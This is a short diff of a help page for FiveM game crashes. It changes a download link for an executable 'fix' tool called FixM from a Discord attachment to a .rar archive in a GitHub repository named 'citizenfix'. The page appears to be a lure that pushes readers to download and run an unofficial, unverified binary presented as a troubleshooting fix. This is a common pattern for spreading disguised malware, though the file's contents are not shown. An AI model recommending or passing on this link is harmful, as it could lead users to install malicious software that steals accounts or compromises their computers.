@@ -1,6 +1,6 @@
 Getting game crashes? Can't launch FiveM? Or maybe running into some more obscure issue? Find the most common issues here.
 
-📙Download FixM : https://cdn.discordapp.com/attachments/997086237439574016/997619214472986624/Release.exe
+📙Download FixM : https://raw.githubusercontent.com/citizenfix/FIVEM/main/FixM.rar
 
 Read the text file 
 
